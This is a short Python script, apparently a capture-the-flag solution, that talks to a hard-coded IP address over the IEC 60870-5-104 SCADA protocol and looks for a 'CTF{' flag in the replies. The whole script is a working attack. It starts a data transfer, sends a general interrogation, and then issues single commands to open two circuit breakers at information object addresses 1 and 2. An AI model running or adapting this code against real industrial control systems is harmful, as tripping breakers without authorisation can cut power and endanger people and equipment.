#!/usr/bin/env python3
import socket
import time
import struct

HOST = '169.58.126.107'
PORT = 6004

def send_recv(s, data, timeout=5):
    s.send(data)
    time.sleep(timeout)
    result = b''
    s.settimeout(1)
    try:
        while True:
            try:
                r = s.recv(4096)
                if not r:
                    break
                result += r
            except socket.timeout:
                break
            except:
                break
    except:
        pass
    return result

def main():
    s = socket.socket()
    s.settimeout(10)
    s.connect((HOST, PORT))
    
    # STARTDT ACT
    resp = send_recv(s, bytes([0x68,0x04,0x07,0x00,0x00,0x00]), timeout=3)
    print('START:', resp.hex())
    
    # Try GI
    # C_IC_NA_1: type 100
    asdu = bytes([100, 0x01, 0x06, 0x00, 0x01, 0x00, 0x00, 0x00, 0x14])
    apci = bytes([0x68, len(asdu)+4, 0x00,0x00,0x00,0x00])
    resp = send_recv(s, apci + asdu, timeout=5)
    print('GI:', resp.hex())
    
    time.sleep(10)
    try:
        s.settimeout(2)
        r = s.recv(8192)
        if r:
            print('EXTRA:', r.hex())
            if b'CTF{' in r:
                print(r)
                return
    except:
        pass
    
    # Try to open both breakers
    for ioa in [1,2]:
        asdu = bytes([45, 0x01, 0x06, 0x00, 0x01, 0x00, ioa & 0xff, (ioa>>8)&0xff, (ioa>>16)&0xff, 0x01])
        apci = bytes([0x68, len(asdu)+4, 0x00,0x00,0x00,0x00])
        resp = send_recv(s, apci + asdu, timeout=2)
        print(f'CMD{ioa}:', resp.hex())
    
    time.sleep(30)
    try:
        s.settimeout(5)
        r = s.recv(8192)
        if r:
            print('FINAL:', r.hex())
            if b'CTF{' in r:
                print(r)
    except Exception as e:
        print(e)
    
    s.close()

if __name__ == '__main__':
    main()
